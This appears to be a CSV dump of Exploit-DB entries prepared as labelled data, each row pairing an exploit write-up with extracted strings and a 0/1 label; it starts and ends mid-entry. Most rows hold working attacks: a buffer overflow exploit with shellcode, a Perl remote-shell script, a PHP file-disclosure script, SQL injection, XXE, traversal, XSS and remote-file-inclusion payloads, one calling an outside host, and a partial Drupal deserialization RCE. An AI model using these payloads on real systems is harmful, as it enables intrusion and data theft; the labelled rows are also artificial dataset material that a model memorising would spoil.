(ELT(4063=4063,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--       Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)     Payload: mod=admin&view=repod&id=plans WHERE 4122=4122 AND (SELECT * FROM (SELECT(SLEEP(5)))zWVH)--  --- [00:47:57] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Apache 2.4.7, PHP 5.5.9 back-end DBMS: MySQL 5.0 [00:47:57] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 444 times","['functions.php ', 'view.php ']",1
36001,Sitecore CMS 6.4.1 - 'url' Open Redirection source: https://www.securityfocus.com/bid/48930/info  Sitecore CMS is prone to a URI-redirection vulnerability because the application fails to properly sanitize user-supplied input.  Successful exploits may redirect a user to a potentially malicious site; this may aid in phishing attacks.  Sitecore CMS versions 6.4.1 rev. 110324 and prior are vulnerable.   http://www.example.com/sitecore/shell/default.aspx?xmlcontrol=Application&url=http://www.example.com&ch=WindowChrome&ic=Applications%2f32x32%2fabout.png&he=About+Sitecore&ma=0&mi=0&re=0,"[""'url'""]",1
25333,"SCO OpenServer 5.0.6/5.0.7 - NWPrint Command Line Argument Local Buffer Overflow // source: https://www.securityfocus.com/bid/12986/info  nwprint that is distributed with SCO OpenServer is prone to a local buffer overflow vulnerability. This issue arises because the application fails to perform boundary checks prior to copying user-supplied data into sensitive process buffers. A local attacker can gain elevated privileges (lp user) by exploiting this issue.   /*  * minervini at neuralnoise dot com (c) 2005  * sample code exploiting a buffer overflow vulnerability in  * NetWare Unix Client 1.1.0Ba on SCO OpenServer 5.0.7;  */  #include <sys/types.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <unistd.h>  #ifndef _PATH # define _PATH (""/usr/lib/nucrt/bin/nwprint"") #endif  /*  * this shellcode may sound a bit tricky; most of the work  * is caused by SCO's way to call the kernel, lcall  $0x7,$0x0,  * translated by the assembler in ""\x9a\x00\x00\x00\x00\x07\x00"";  * to avoid zeroes i push the NOT-ed bytes on the stack, NOT them  * and then jump to %esp;  * if anyone knows a shorter way to do this execve, a mail is appreciated.  */  char *scode =   ""\x31\xc9""             // xor    %ecx,%ecx   ""\x89\xe3""             // mov    %esp,%ebx   ""\x68\xd0\x8c\x97\xff"" // push   $0xff978cd0   ""\x68\xd0\x9d\x96\x91"" // push   $0x91969dd0   ""\x89\xe2""             // mov    %esp,%edx   ""\x68\xff\xf8\xff\x6f"" // push   $0x6ffff8ff   ""\x68\x9a\xff\xff\xff"" // push   $0xffffff9a   ""\x80\xf1\x10""         // xor    $0x10,%cl   ""\xf6\x13""             // notb   (%ebx)   ""\x4b""                 // dec    %ebx   ""\xe2\xfb""             // loop   $-3   ""\x91""                 // xchg   %eax,%ecx   ""\x50""                 // push   %eax   ""\x54""                 // push   %esp   ""\x52""                 // push   %edx   ""\x50""                 // push   %eax   ""\x34\x3b""             // xor    $0x3b,%al   ""\xff\xe3"";            // jmp    *%ebx  unsigned long get_sp (void) {    __asm__(""movl %esp,%eax""); }  int main (int argc, char **argv) {     int i, slen = strlen(scode), offset = 0;    long ptr, *lptr;    char *buf;     if (argc > 1)      offset = strtoul(argv[1], NULL, 0);     buf = (char *)malloc(1024);    memset(buf, 0, 1024);     for (i = 0; i < (901 - slen); i++)      buf[i] = 0x90;     printf(""shellcode length: %d\n"", slen);     for (i = (901 - slen); i < 901; i++)      buf[i] = scode[i - (901 - slen)];     lptr = (long *)(buf + 901);     printf(""address: 0x%lx\n"", ptr = (get_sp() - offset));     for (i = 0; i < 30; i++)      *(lptr + i) = (int)ptr;     execl(_PATH, ""nwprint"", buf, NULL);     return(0); }",['NWPrint Command Line'],1
44466,"Microsoft Windows - 'CiSetFileCache' TOCTOU Incomplete Fix Windows: CiSetFileCache TOCTOU CVE-2017-11830 Incomplete Fix Platform: Windows 10 1709 (including Win10S) Class: Security Feature Bypass  Summary: The fix for CVE-2017-11830 is insufficient to prevent a normal user application adding a cached signing level to an unsigned file by exploiting a TOCTOU in CI leading to circumventing Device Guard policies.  Description: The previous issue I reported was due to not checking for write access on the target file handle when setting the cache. This allows a user application to abuse a TOCTOU and rewrite the file after the hash has been generated for the file. The only changed code seems to be below:  FILE_OBJECT target_file; ObReferenceObjectByHandle(FileHandle, 0, *IoFileObjectType, &target_file);  if (target_file->SharedWrite) {    return STATUS_SHARING_VIOLATION; }  if (target_file->WriteAccess) {  ← Additional check for the file being opened for write.       if ((PsGetProcessProtection(PsGetCurrentProcess()) & 7) != ProtectedProcessLight)         return STATUS_SHARING_VIOLATION; }  The fix was to add a check that the target file passed isn’t writable. This combined with the check for FILE_SHARE_WRITE should mean the user can’t hold on to a writable file handle. However, when the file handle is converted to a file object with ObReferenceObjectByHandle the desired access is 0, which means we can pass a handle with any granted access including SYNCHRONIZE or READ_CONTROL, which do not respect file sharing. So we can still exploit this issue by doing the following:  1. Open the file for write access. 2. Reopen another handle to the file for SYNCHRONIZE access. This works as this access right can be used regardless of the sharing mode. 3. Set cached signing level through the handle opened in 2. 4. Wait for oplock, rewrite file using handle opened in 1. Release oplock.  Proof of Concept:  I’ve provided a PoC as a C# project. It will allow you to “cache sign” an arbitrary executable. If you want to test this on a locked down system such as Win10S you’ll need to sign the PoC (and the NtApitDotNet.dll assembly) so it’ll run. Or use it via one of my .NET based DG bypasses, in that case you can call the PoC_CacheSignature.Exploit.Run method directly. It copies notepad to a file, attempts to verify it but uses an oplock to rewrite the contents of the file with the untrusted file before it can set the kernel EA.  1) Compile the C# project. It will need to grab the NtApiDotNet v1.1.7 package from NuGet to work. 2) Execute the PoC passing the path to an unsigned file and to the output  “cache signed” file, e.g. poc unsigned.exe output.exe 3) You should see it print the signing level, if successful. 4) You should not be able to execute the unsigned file, bypassing the security policy enforcement.  NOTE: If it prints an exception then the exploit failed. The opened catalog files seemed to be cached for some unknown period of time after use so if the catalog file I’m using for a timing signal is already open then the oplock is never broken. Just rerun the poc which will pick a different catalog file to use. Also the output file must be on to a NTFS volume with the USN Change Journal enabled as that’s relied upon by the signature level cache code. Best to do it to the boot drive as that ensures everything should work correctly.  Expected Result: Access denied or at least an error setting the cached signing level.  Observed Result: The signing level cache is applied to the file with no further verification. You can now execute the file as if it was signed.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/44466.zip","[""'CiSetFileCache'"", 'TOCTOU']",1
19408,"Zend Framework < 2.0.0 beta4 < 1.12 RC1 < 1.11.11 - Local File Disclosure SEC Consult Vulnerability Lab Security Advisory < 20120626-0 > =======================================================================               title: Local file disclosure via XXE injection             product: Zend Framework  vulnerable version: 1.11.11                      1.12.0 RC1                      2.0.0 beta4                      and earlier versions / branches       fixed version: 1.11.12                      1.12.0 RC2                      2.0.0 beta5 / trunk              impact: Critical            homepage: http://framework.zend.com/               found: 2012-06-18                  by: K. Gudinavicius                       SEC Consult Vulnerability Lab                       https://www.sec-consult.com =======================================================================  Vendor description: ------------------- ""Extending the art & spirit of PHP, Zend Framework is based on simplicity, object-oriented best practices, corporate friendly licensing, and a rigorously tested agile codebase. Zend Framework is focused on building more secure, reliable, and modern Web 2.0 applications & web services, and consuming widely available APIs from leading vendors like Google, Amazon, Yahoo!, Flickr, as well as API providers and cataloguers like StrikeIron and ProgrammableWeb.""  Source: http://framework.zend.com/about/overview    Vulnerability overview/description: ----------------------------------- The XmlRpc package of Zend Framework is vulnerable to XML eXternal Entity Injection attacks (both server and client). The SimpleXMLElement class (SimpleXML PHP extension) is used in an insecure way to parse XML data. External entities can be specified by adding a specific DOCTYPE element to XML-RPC requests. By exploiting this vulnerability an application may be coerced to open arbitrary files and/or TCP connections.   Other software that uses the XmlRpc package of Zend Framework is then also vulnerable to XML eXternal Entity Injection attacks!   Proof of concept: ----------------- For example, the loadXml function (Zend\XmlRpc\Request.php and Response.php) fails to disable external entities when parsing XML data. There is no call to the libxml_disable_entity_loader function before initializing the SimpleXMLElement class. Related code excerpt:      public function loadXml($request)     {         if (!is_string($request)) {             $this->_fault = new Zend_XmlRpc_Fault(635);             $this->_fault->setEncoding($this->getEncoding());             return false;         }          try {             $xml = new SimpleXMLElement($request);         } catch (Exception $e) {             // Not valid XML             $this->_fault = new Zend_XmlRpc_Fault(631);             $this->_fault->setEncoding($this->getEncoding());             return false;         }      [...]    }  If a web application uses the Zend_XmlRpc_Server() class (Zend\XmlRpc\Server.php) to handle XML-RPC requests, it is possible to disclose arbitrary local files from the remote system. The following HTTP POST request to the vulnerable XmlRpc server application illustrates the exploitation of this vulnerability.  POST /xmlrpc_server.php HTTP/1.1 Host: $host  <?xml version=""1.0""?>  <!DOCTYPE foo [     <!ELEMENT methodName ANY >   <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]> <methodCall>   <methodName>&xxe;</methodName> </methodCall>    Vulnerable / tested versions: ----------------------------- The vulnerability has been verified to exist in versions 1.11.11 and  2.0.0beta4 of Zend Framework, which were the most recent versions at  the time of discovery.  Furthermore, previous versions and 1.12.0 RC1 are also affected.  Older branches are also affected but won't be fixed by Zend as they are not maintained anymore. Their policy is to fix the current minor release and the immediate previous minor release.   Vendor contact timeline: ------------------------ 2012-06-18: Contacting vendor through zf-security@zend.com 2012-06-18: Vendor: Very fast reply, fixes issue already after 3 hours! 2012-06-18: Confirming server-side fix, adding recommendation for XmlRpc             client code 2012-06-19: Vendor: XmlRpc client code also fixed             Confirming fix 2012-06-20: Contacting local CERT 2012-06-20: Vendor: starts packaging, expected release of 1.11.12 and             1.12.0RC2 by end of week, ZF2 trunk already fixed, next beta             2.0.0beta5 will be released late next week 2012-06-22: Vendor: Packages are created and staged, packages and security             announcement will be released on Monday 2012-06-25: New packages and Zend security advisory released by vendor 2012-06-26: SEC Consult releases security advisory    Solution: --------- Upgrade to the latest version available, e.g. * v1.11.12 * v1.12.0 RC2 * update ZF2 master trunk  If you are using an older branch you are urged to upgrade!  Zend framework security advisory: http://framework.zend.com/security/advisory/ZF2012-01  Download link for new releases: http://framework.zend.com/download/latest   Commits: -------- http://framework.zend.com/code/log.php?repname=Zend+Framework&path=%2F  * Zend Framework 1.X   Trunk:   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Ftrunk&rev=24970&peg=24970   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24975  * 1.11.X:   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24971&peg=24971   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24972&peg=24972   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24976  * 1.12.0:    http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24973&peg=24973   http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24977  * Zend Framework 2.0   https://github.com/zendframework/zf2/pull/1523   Workaround: ----------- None   Advisory URL: ------------- https://www.sec-consult.com/en/advisories.html   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SEC Consult Unternehmensberatung GmbH  Office Vienna Mooslackengasse 17 A-1190 Vienna Austria  Tel.: +43 / 1 / 890 30 43 - 0 Fax.: +43 / 1 / 890 30 43 - 25 Mail: research at sec-consult dot com https://www.sec-consult.com  EOF K. Gudinavicius, J. Greil / @2012","['Request.php ', 'Server.php)']",1
24877,"OpenCart 1.5.5.1 - 'FileManager.php' Directory Traversal Arbitrary File Access [waraxe-2013-SA#098] - Directory Traversal Vulnerabilities in OpenCart 1.5.5.1 ===============================================================================  Author: Janek Vind ""waraxe"" Date: 19. March 2013 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-98.html   Description of vulnerable software: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  OpenCart is a turn-key ready ""out of the box"" shopping cart solution. You simply install, select your template, add products and your ready to start accepting orders.  http://www.opencart.com/  Affected are all OpenCart versions, from 1.4.7 to 1.5.5.1, maybe older too.  ############################################################################### 1. Directory Traversal Vulnerabilities in ""filemanager.php"" ###############################################################################  Reason: insufficient sanitization of user-supplied data Attack vectors:  1. user-supplied POST parameters ""directory"", ""name"", ""path"", ""from"", ""to"" Preconditions:  1. Logged in as admin with filemanager access privileges   Script ""filemanager.php"" offers for OpenCart admins various file related services: directory listing and creation, image file listing, file copy/move/unlink, upload, image resize. By the design OpenCart admin can manage files and directories only inside specific subdirectory ""image/data/"". It means, that even if you have OpenCart admin privileges, you still are not suppose to get access to the files and directories below ""image/data/"". So far, so good. But what about directory traversal? Let's have a look at the source code.  PHP script ""admin/controller/common/filemanager.php"" line 66: ------------------------[ source code start ]---------------------------------- public function directory() {         $json = array();          if (isset($this->request->post['directory'])) {         $directories = glob(rtrim(DIR_IMAGE . 'data/' .             str_replace('../', '', $this->request->post['directory']), '/') .             '/*', GLOB_ONLYDIR);                   if ($directories) {             $i = 0;                      foreach ($directories as $directory) {                 $json[$i]['data'] = basename($directory);                 $json[$i]['attributes']['directory'] =                     utf8_substr($directory, strlen(DIR_IMAGE . 'data/')); ...          $this->response->setOutput(json_encode($json)); ------------------------[ source code end ]------------------------------------  We can see, that directory traversal is prevented by removing ""../"" substrings from user submitted parameters. At first look this seems to be secure enough - if we can't use ""../"", then directory traversal is impossible, right? Deeper analysis shows couple of shortcomings in specific filtering method. First problem - if OpenCart is hosted on Windows platform, then it's possible to use ""..\"" substring for directory traversal.  Test (parameter ""token"" must be valid): -------------------------[ test code start ]----------------------------------- <html><body><center> <form action=""http://localhost/oc1551/admin/index.php?route=common/filemanager/directory&token=92aa6ac32b4c8e7a175c3dc9f7754d25"" method=""post""> <input type=""hidden"" name=""directory"" value=""..\..\..\""> <input type=""submit"" value=""Test""> </form> </center></body></html> --------------------------[ test code end ]------------------------------------  Server response is in JSON format and contains listing of subdirectories outside of OpenCart main directory.  Second problem - filtering with ""str_replace"" can be tricked by using custom strings. If we use ""..././"" substring, then after filtering in becomes ""../"". So it appears, that implemented anti-traversal code is ineffective and can be bypassed.  Test (parameter ""token"" must be valid): -------------------------[ test code start ]----------------------------------- <html><body><center> <form action=""http://localhost/oc1551/admin/index.php?route=common/filemanager/directory&token=92aa6ac32b4c8e7a175c3dc9f7754d25"" method=""post""> <input type=""hidden"" name=""directory"" value=""..././..././..././..././""> <input type=""submit"" value=""Test""> </form> </center></body></html> --------------------------[ test code end ]------------------------------------  Server response is exactly same as in previous test - information about directory structure outside of OpenCart main directory has been disclosed.  PHP script ""filemanager.php"" contains 14 uses of ""str_replace('../', '',"" code. Most of the public functions in ""filemanager.php"" are affected by directory traversal vulnerability:  public function directory() -> listing of subdirectories public function files() -> listing of image files public function create() -> creation of new directories public function delete() -> deletion of arbitrary files and directories public function move() -> renaming of files or directories public function copy() -> copying of files or directories public function rename() -> renaming of files or directories public function upload() -> uploading of image or flash files    Contact: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  come2waraxe@yahoo.com Janek Vind ""waraxe""  Waraxe forum:  http://www.waraxe.us/forums.html Personal homepage: http://www.janekvind.com/ Random project: http://albumnow.com/ ---------------------------------- [ EOF ] ------------------------------------","[""'FileManager.php'""]",1
2595,"LoCal Calendar 1.1 - 'lcUser.php' Remote File Inclusion +------------------------------------------------------------------------------------------- local Calendar System v1.1 (lcUser.php) Remote File Include --------------------------------------------------------------------------------------------- An advanced instrumentation reservation system for equipment calendaring and user management. -------------------------------------------------------------------------------------------- download : ftp://ftp.loci.wisc.edu/locisoftware/LoCal/LoCal-1.1.tar.gz -------------------------------------------------------------------------------------------- screenshot : http://www.loci.wisc.edu/calendar/tutorial/monthview.jpg -------------------------------------------------------------------------------------------- code : require ""$LIBDIR/lcMembership.inc""; require ""$LIBDIR/lcErrorChecker.inc""; -------------------------------------------------------------------------------------------- exploit: local/lib/lcUser.php?LIBDIR=http://members.lycos.co.uk/o0xxdark0o3/ms.txt? -------------------------------------------------------------------------- greetz : :( no one ------------------------------------------------------------------------- by o0xxdark0o i think... so that... i m here o0xxdark0o@msn.com ##---------------------------------------------------------------------------------------------------  # milw0rm.com [2006-10-18]","[""'lcUser.php'""]",1
9257,"Pixaria Gallery 2.3.5 - 'file' Remote File Disclosure <?php ini_set(""max_execution_time"",0); print_r('                                        ||          ||   | ||                                 o_,_7 _||  . _o_7 _|| q_|_||  o_///_,                                (  :  /    (_)    /           (      .                                          ___________________                                       _/QQQQQQQQQQQQQQQQQQQ\__ [q] Pixaria Gallery 2.3.5          __/QQQ/````````````````\QQQ\___   Remote File Disclosure         _/QQQQQ/                  \QQQQQQ\ [q] _GET   <3                   /QQQQ/``                    ```QQQQ\                                /QQQQ/                          \QQQQ\ [q] http://pixaria.com        |QQQQ/    By  Qabandi             \QQQQ|                               |QQQQ|                            |QQQQ|                               |QQQQ|    From Kuwait, PEACE...   |QQQQ|                               |QQQQ|                            |QQQQ|                               |QQQQ\       iqa[a]hotmail.fr     /QQQQ| [/]   -[hai]-                  \QQQQ\                      __  /QQQQ/                                 \QQQQ\                    /QQ\_QQQQ/                                  \QQQQ\                   \QQQQQQQ/                                   \QQQQQ\                 /QQQQQ/_                                    ``\QQQQQ\_____________/QQQ/\QQQQ\_                                       ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\                                          ```````````````````     `````  ______________________________________________________________________________ /                                                                              \ |                          meh.....                                            | \______________________________________________________________________________/                                 \ No More Private /                                  ````````````````` ');  if ($argc<4) { print_r(' ----------------------------------------------------------------------------- Usage:   php '.$argv[0].' VICTIM DIR FILE  example: php '.$argv[0].' EXAMPLE /demo/ /etc/passwd  or if in root dir: example: php '.$argv[0].' EXAMPLE // /etc/passwd php '.$argv[0].' EXAMPLE // ./pixaria.config.php ----------------------------------------------------------------------------- '); die; }  function QABANDI($victim,$vic_dir,$file){ $host = $victim; $p = ""http://"".$host.$vic_dir;   $file2 = base64_encode($file);            $packet =""GET "".$p.""/pixaria.image.php?file="".$file2."" HTTP/1.0\r\n"";           $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n"";           $packet.=""Pragma: no-cache\r\n"";           $packet.=""Connection: Close\r\n\r\n"";  	$o = @fsockopen($host, 80); 	if(!$o){ 		echo ""\n[x] No response...\n""; 		die; 	} 	 	fputs($o, $packet); 	while (!feof($o)) $data .= fread($o, 1024); 	fclose($o); 	 	$_404 = strstr( $data, ""HTTP/1.1 404 Not Found"" ); 	if ( !empty($_404) ){ 		echo ""\n[x] 404 Not Found... Make sure of path. \n""; 		die; 	}                                             return $data;   }  $host1 = $argv[1]; $userdir1=$argv[2]; $file= $argv[3];        if ($argc > 2) {     echo ""Getting file Data....[i9bir]\n""; print_r(QABANDI($host1,$userdir1,$file));   } ?>  # milw0rm.com [2009-07-24]","[""'file'""]",0
31491,Quick Classifieds 1.0 - 'controlcenter/verify.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info              Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.              Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.              Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/controlcenter/verify.php3?DOCUMENT_ROOT=ZoRLu.txt?,"[""'controlcenter/verify.php3?DOCUMENT_ROOT'""]",1
8970,"McAfee 3.6.0.608 - 'naPolicyManager.dll' ActiveX Arbitrary Data Write GOODFELLAS Security Research TEAM http://goodfellas.shellcode.com.ar Greetings to str0ke   McAfee, Inc. 3.6.0.608 Policy Manager naPolicyManager.dll Arbitrary Data Write ==============================================================================  Internal ID: VULWAR20090616. -----------   Introduction ------------  naPolicyManager.dll is a library included in the Program Mc Afee inc.   Tested In ---------  - Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.   Summary -------  The WriteTaskDataToIniFile method doesn't check if it's being called from the application or from a malicious user. A Remote Attacker could craft a  html page and overwrite arbitrary files in a system.   Impact ------  The vulnerability could allow malicious users to write arbitrary data on a  vulnerable system that uses this software.   Workaround ----------  - Activate the Kill bit zero in the clsid corresponding to the software. - Unregister naPolicyManager.dll using regsvr32.   Timeline --------  July 16 2009 -- Bug Discovery. July 16 2009 -- POC published.   Credits -------   * callAX <bemariani@gmail.com>   Technical Details -----------------  WriteTaskDataToIniFile method receives one argument filename in this format ""c:\path\file"".   Proof of Concept ---------------  <HTML> <BODY>  <object id=ctrl classid=""clsid:{04D18721-749F-4140-AEB0-CAC099CA4741}""></object> <SCRIPT> function Do_1t()  {    File = ""C:\b00t.ini""    ctrl.WriteTaskDataToIniFile(File)  } </SCRIPT> <input language=JavaScript onclick=Do_1t() type=button value=""P0c""> </BODY> </HTML>  # milw0rm.com [2009-06-16]","[""'naPolicyManager.dll'""]",1
39073,Seowon Intech WiMAX SWC-9100 Router - '/cgi-bin/reboot.cgi' Remote Reboot (Denial of Service) source: https://www.securityfocus.com/bid/65306/info  WiMAX SWC-9100 Mobile Router is prone to a security-bypass vulnerability and a command-injection vulnerability.  Exploiting these issues could allow an attacker to bypass certain security restrictions or execute arbitrary commands in the context of the device.   http://www.example.com/cgi-bin/reboot.cgi?select_option_value=factory_default&reboot_option=on&action=Apply http://www.example.com/cgi-bin/reboot.cgi?select_option_value=default_reboot&reboot_option=on&action=Apply,"[""'/cgi-bin/reboot.cgi'""]",1
22050,"BizDesign ImageFolio 2.x/3.0.1 - 'imageFolio.cgi?direct' Cross-Site Scripting source: https://www.securityfocus.com/bid/6265/info  Reportedly, ImageFolio is prone to cross site scripting attacks due to insufficient sanitization of user-supplied input. The vulnerability exists in various cgi scripts included with ImageFolio.  As a result, it is possible for a remote attacker to create a malicious link containing script code which will be executed in the browser of a legitimate user, in the context of the website running Bugzilla.  This issue may be exploited to steal cookie-based authentication credentials from legitimate users of the website running the vulnerable software.  /cgi-bin/imageFolio.cgi?direct=<script>alert(""SecurityHole"")</script>","[""'imageFolio.cgi?direct'""]",1
38674,WordPress Plugin FlagEm - 'cID' Cross-Site Scripting source: https://www.securityfocus.com/bid/61401/info  The FlagEm plugin for WordPress is prone to a cross-site-scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/wp-content/plugins/FlagEm/flagit.php?cID=[Xss],"[""'cID'""]",1
37946,WordPress Plugin Crayon Syntax Highlighter - 'wp_load' Remote File Inclusion source: https://www.securityfocus.com/bid/55919/info  The Crayon Syntax Highlighter plug-in for WordPress is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting these issues may allow a remote attacker to obtain sensitive information or to execute arbitrary script code in the context of the web server process. This may allow the attacker to compromise the application and the underlying computer; other attacks are also possible.  Crayon Syntax Highlighter 1.12.1 is vulnerable; other versions may also be affected.  http://www.example.com/wordpress/wp-content/plugins/crayon-syntax-highlighter/util/ajax.php?wp_load=ftp://192.168.80.201/wp-load.php,"[""'wp_load'""]",1
25623,"CJ Ultra Plus 1.0.3/1.0.4 - 'OUT.php' SQL Injection source: https://www.securityfocus.com/bid/13533/info  CJ Ultra Plus is prone to an SQL injection vulnerability.  This issue affects the 'out.php' script and could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.   /out.php?url=sad&perm=33333333333333333333333333332'%20UNION%20SELECT%20b12,b12%20FROM%20settings%20INTO%20OUTFILE%20'/path/to/ur/dir/x.txt/*","[""'OUT.php'""]",1
1892,"Guestex Guestbook 1.00 - 'email' Remote Code Execution ## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org) ## Name: GUESTEX-exec.pl ## Date: 06/07/2006 ## Version: 1.00 ##  1.00 (06/07/2006) - GUESTEX-exec.pl created ##  ## Description: GUESTEX guestbook is vulnerable to remote code execution in how it  ##  handles it's 'email' parameter. $form{'email'} is used when openning a pipe to  ##  sendmail in this manner: open(MAIL, ""$sendmail $form{'email'}) where $form{'email'}  ##  is not properly sanitized. ## ## Usage: specify the host and location of the script as the first argument. hosts can  ##  contain ports (host:port) and you CAN specify a single command to execute via the  ##  commandline, although if you do not you will be given a shell like interface to  ##  repeatedly enter commands. ####################################################################################### use IO::Socket; use strict;  my $host = $ARGV[0]; my $location = $ARGV[1]; my $command = $ARGV[2]; my $sock; my $port = 80; my $comment = $ARGV[3] || ""YOUR SITE OWNS!\n"";  if (!($host && $location)) {  	die(""-!> perl $0 <host[:port]> <location> [command] [comment]\n""); }  $port = $1  if ($host =~ m/:(\d+)/);  while (1) {  	my $switch = 0; 	if (!($ARGV[2])) { 		print 'guestex-shell$ '; 		chomp($command = <STDIN>); 	}  	my $cmd = "";echo --1337 start-- ;$command; echo --1337 end--""; 	$cmd =~ s/(.)/sprintf(""%%%x"", ord($1))/ge;  	my $POST = ""POST $location HTTP/1.1\r\n""  		             . 	           ""Host: $host\r\n""                                         . 		   ""User-Agent: mozilla\r\n""                                 . 	           ""Content-type: application/x-www-form-urlencoded\r\n""     . 		   ""Content-length: "" . length(""surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\@yahoo.com$cmd"") . ""\r\n"" .  		   ""Referer: $host\r\n\r\n""; 	 	$POST .= ""surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\@yahoo.com$cmd""; 	 	$sock = IO::Socket::INET->new('PeerAddr' => ""$host"",         	                      'PeerPort' => $port,                 	              'Proto'    => 'tcp', 				      'Type'     => SOCK_STREAM) or die (""-!> unable to connect to '$host:$port': $!\n"");  	$sock->autoflush();  	print $sock ""$POST"";  	#$switch = 1; # used for debugging if you think 'echo' might not be working, etc 	  	while (my $line = <$sock>) { 		if ($line =~ m/^\-\-1337\ start\-\-$/) { 			$switch = 1; 			next; 		} 		if ($line =~ m/^\-\-1337\ end\-\-$/) { 			close($sock); 			last; 		} 		print $line if $switch; 	} 	exit if $ARGV[2]; }  # milw0rm.com [2006-06-08]","[""'email'"", 'GUESTEX']",1
44138,"PHIMS - Hospital Management Information System - 'Password' SQL Injection # Exploit Title:  PHIMS - Hospital Management Information System - 'Password' SQL Injection # Dork: N/A # Date: 2018-02-16 # Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com # Vendor Homepage: https://codecanyon.net/item/phims/14974225?s_rank=1566 # Version: All version # Category: Webapps # CVE: N/A # # # # # # Description: # The vulnerability allows an attacker to inject sql commands. # # # # # # Proof of Concept :  SQLI :   # Parameter : Password (POST) #    Type: Error based #    Title:  MariaDB >= 10.2.11 AND Error based - extractvalue (XPATH query) #    Payload : 1"" and extractvalue(1,concat(0x3a,user(),0x3a,version()))# ####################################### # Discrption : The 'password' field is vulnerable in this script ('Password' parameter).First inject payload into this parameter. # then put anything in username (like:anything@anything.anything) and click login. You will have XPATH syntax error in the next page that contains user and db_name . # You can find all tables and any information from database by using XPATH query .   Username : anything@anything.anything Password : 1"" and extractvalue(1,concat(0x3a,user(),0x3a,version()))#","[""'Password'""]",1
46452,"Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution Analyzing the patch By diffing Drupal 8.6.9 and 8.6.10, we can see that in the REST module, FieldItemNormalizer now uses a new trait, SerializedColumnNormalizerTrait. This trait provides the checkForSerializedStrings() method, which in short raises an exception if a string is provided for a value that is stored as a serialized string. This indicates the exploitation vector fairly clearly: through a REST request, the attacker needs to send a serialized property. This property will later be unserialize()d, thing that can easily be exploited using tools such as PHPGGC. Another modified file gives indications as to which property can be used: LinkItem now uses unserialize($values['options'], ['allowed_classes' => FALSE]); instead of the standard unserialize($values['options']);.  As for all FieldItemBase subclasses, LinkItem references a property type. Shortcut uses this property type, for a property named link.  Triggering the unserialize() Having all these elements in mind, triggering an unserialize is fairly easy:  GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1 Host: 192.168.1.25 Content-Type: application/hal+json Content-Length: 642  {   ""link"": [     {       ""value"": ""link"",       ""options"": ""<SERIALIZED_CONTENT>""     }   ],   ""_links"": {     ""type"": {       ""href"": ""http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default""     }   } } Since Drupal 8 uses Guzzle, we can generate a payload using PHPGGC:  $ ./phpggc guzzle/rce1 system id --json ""O:24:\""GuzzleHttp\\Psr7\\FnStream\"":2:{s:33:\""\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\"";a:1:{s:5:\""close\"";a:2:{i:0;O:23:\""GuzzleHttp\\HandlerStack\"":3:{s:32:\""\u0000GuzzleHttp\\HandlerStack\u0000handler\"";s:2:\""id\"";s:30:\""\u0000GuzzleHttp\\HandlerStack\u0000stack\"";a:1:{i:0;a:1:{i:0;s:6:\""system\"";}}s:31:\""\u0000GuzzleHttp\\HandlerStack\u0000cached\"";b:0;}i:1;s:7:\""resolve\"";}}s:9:\""_fn_close\"";a:2:{i:0;r:4;i:1;s:7:\""resolve\"";}}"" We can now send the payload via GET:  GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1 Host: 192.168.1.25 Content-Type: application/hal+json Content-Length: 642  {   ""link"": [     {       ""value"": ""link"",       ""options"": 